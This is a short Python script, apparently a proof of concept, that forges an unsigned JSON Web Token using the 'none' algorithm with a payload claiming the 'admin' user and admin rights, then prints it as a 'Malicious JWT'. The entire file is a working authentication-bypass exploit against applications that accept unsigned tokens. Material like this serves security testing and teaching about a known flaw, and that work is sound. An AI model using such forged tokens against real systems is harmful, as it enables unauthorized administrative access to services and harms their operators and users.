import jwt

#creates a jwt none algorithm and sets admin permissions to true
header = {"alg": "none", "typ": "JWT"}
payload = {"username": "admin", "admin": True}

#encodes it without a signature
malicious_token = jwt.encode(payload, key=None, algorithm='none', headers=header)

print("Malicious JWT:", malicious_token)